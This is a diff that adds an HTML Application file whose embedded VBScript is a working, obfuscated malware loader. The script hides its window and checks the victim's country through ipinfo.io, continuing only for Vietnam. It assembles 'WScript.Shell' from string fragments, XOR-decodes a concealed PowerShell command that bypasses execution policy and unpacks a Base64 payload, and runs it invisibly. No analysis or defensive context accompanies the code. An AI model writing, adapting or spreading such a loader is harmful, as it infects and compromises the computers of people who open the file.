@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+<HTA:APPLICATION
+ID="#"
+SYSMENU = "no"
+BORDER="no"
+SHOWINTASKBAR="no"
+CAPTION="no"
+SINGLEINSTANCE="yes"
+WINDOWSTATE="minimize"
+>
+<script type="text/vbscript">
+
+Set r = CreateObject("WinHttp.WinHttpRequest.5.1")
+r.Open "GET", "http"&"://ipinfo"&".io/coun"&"try", False
+r.Send
+geo = InStr(r.responseText, "VN")
+If geo = 0 Then
+    self.close
+End If
+
+Set o = CreateObject("WS"+"cr"+"ip"+"t."+"S"+"he"+"l"+"l")
+mostlycloudfortomorrowcontent = "qnvdsrIDmM!,onQsNghm!!,dydbTUHno!!CXq@RR!!,bnlL`Oe!hdy)ZRxrudl/Udyu/Dobnehof\;;TUG9/FduRushof)ZRxrudl/Bnowdsu\;;GsnlC`rd75Rushof)&`VXfJBfnJDemeB0YcVmQXlqmX2PfW3mtL{KgP38ubIW1[YKUdYO1[V1qMoCiboSw[lSwcVGqchjfMVWyHBSFXVy{[R@qHB0wbh@nHB0tc2PfKDWtekqWT1WRSD4USD8OPTmNJRjOBh@fHBC6EPnfHB@fHB@fHBSEcET1bV[MSR@8HBKDU10CRT57HD4QXF4fchHOBh@fHBC8HFWrb3Tfdx@jP3v0OIGlR1TfQR@hSD8OPTmNNhC[SWOfclCtHo1OBhSEcET1bV[MSR@sQR@hT0mUWDWORT4FU{qfclCtHh@sHBfnb2m{eFWu`V4lcxjfMVqw`V5fHlCtHhjOBhSEcET1bV[MSR@sQR@hXF4fcjmPP18NSjmINlCtXF5hHBrfJBiqbFOwcl[q[x@wXVyrJR@u`l8qch@hXF5hJP1JKDOrOUSy[juGHBr8HBKfclCtUjWTT0SCWEqfclCtHh@sHBfnclW1b2SieB@u[hjfMVqw`V5fHlCtHhjOBhSEcET1bV[MSR@sQR@hXF4fcj4GWG[KSWb7XF4fchHfJx@nJF4meBC3`VW2JR@u`l8qch@hXF5hJP1JKDOrOUSy[juGHBr8HBKfclCtWDGUR1yKT0P7XF4fchHfJx@nJISib3ur`YO1JR@u`l8qch@hXF5hJP1JKDOrOUSy[juGHBr8HBKfclCtW1iQPT0KNlCtXF5hHBrfJBi2`F8icVjqHB0pc3mtHBKfchHqEPnjP3v0OIGlR1TfJ{1fHlCtXF4WT1WRUjGOSUqfclCtHh@sHBfnclW1HIW{[YHfKFWtekq0b3WxclGu[R@w[F8uXVmtJR@u`l8qch@hXF5hJP1JKDOrOUSy[juGHBr8HBKfclCtSD8OPTmNHDGDUTmNT{qfclCtHh@sHBfnclW1HFexc2WvHBKjc30i`V5fXVSu`V4{Hh@w[F8uXVmtHBjfMVqw`V5fHlCtHhjOBhSEcET1bV[MSR@sQR@hXF4fcjSGT1uTU0@7XF4fchHfJx@nS3W1MTOn`VyjRYSmcR@nV3Wtelmxc34u[V41YUn7[3W1[l8r[FWxbFG1`Bfh[FW{`2SwbBHqJRC9HD80eB0UeIKqclbqEPnjP3v0OIGlR1TfJ{1fHlCtXF4CWkqfclCtHh@sHBiI[YPuW30qU3Kp[VO1HB0NXV0mb2CiX3TfHoKwc2SbT3WkeYKqeImE[V41[YHxHh@uTYWmbojfHmOGUDWEWB@pHD[RU11fPV41`W[qboW{TIKw[IWkeBHqMlSqb2CrXYmNXV0mEPnjVVWxUYm2[YHfQRCcT2m{eFWuMmSmdIPtSV4kc3SqcleeNkqWWDX5MjemeDK4eFW{JBSEcET1bV[MSRjOBhSGclO[[YHfQWuEc343[YK1YUn7WF8BXYOmOkSUeIKqclbnKGmmbj04e3WxJP1JKGW4Lj4Fbx@8HBH5NED1OUD2OVKhNVWlLEf5X{Xy[kWiXk@5NUbvLVSjOxH6EPnjbEC{eG@1bkSuHE1fPIuvXYO{QRSWdUKNSoL6[FG1XU1jSV4kVVWxgP1J`YexHB0Wbljf`IS1bEnwM30m[3GkdVKmbl4me2LtX38uM3On[VOs`V5tbFivHB0O[YSnc3PfTD8UWB@uPl8jdR@jbEC{eG@1bkSu&((("
+
+dIaNadIaNadIaNadIaNadIaNadIaNa = ""
+    For i = 0 To Len(mostlycloudfortomorrowcontent) - 1
+        dIaNadIaNadIaNadIaNadIaNadIaNa = dIaNadIaNadIaNadIaNadIaNadIaNa & Chr(Asc(Mid(mostlycloudfortomorrowcontent, i + 1, 1)) Xor 1)
+    Next
+o.run dIaNadIaNadIaNadIaNadIaNadIaNa, 0, false
+
+self.close
+</script>
+</head>
+<body>
+</body>
+</html>
